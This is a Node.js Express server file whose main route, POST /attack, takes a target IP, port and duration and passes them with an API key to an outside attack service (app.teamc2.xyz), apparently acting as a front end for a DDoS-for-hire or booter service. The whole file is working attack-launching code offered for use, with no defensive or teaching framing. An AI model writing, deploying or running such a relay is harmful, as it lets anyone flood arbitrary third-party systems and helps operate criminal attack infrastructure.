// file: server.js

require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// ENV
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT;

if (!PORT) {
  console.error("FATAL: PORT not provided");
  process.exit(1);
}

console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
console.log("Binding PORT:", PORT);

// Global error handlers
process.on("uncaughtException", (err) => {
  console.error("UNCAUGHT ERROR:", err);
});

process.on("unhandledRejection", (err) => {
  console.error("UNHANDLED PROMISE:", err);
});

// Health routes
app.get("/", (req, res) => res.status(200).send("OK"));
app.get("/health", (req, res) => res.status(200).send("OK"));
app.get("/test", (req, res) => res.json({ msg: "Test OK" }));

// Main API
app.post("/attack", async (req, res) => {
  try {
    let { ip, port, time } = req.body;

    // 🔒 Basic validation
    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    if (!API_KEY) {
      return res.status(500).json({ error: "API key missing" });
    }

    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    const response = await axios.get(url, {
      timeout: 15000,
    });

    return res.json({
      success: true,
      data: response.data, // ✅ actual API response
    });

  } catch (err) {
    console.error("ERROR:", err?.response?.data || err.message);

    return res.status(500).json({
      error: err?.response?.data || "Server error",
    });
  }
});

// Start server
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});

// Graceful shutdown
process.on("SIGTERM", () => {
  console.log("SIGTERM received. Shutting down...");
  server.close(() => {
    console.log("Server closed");
    process.exit(0);
  });
});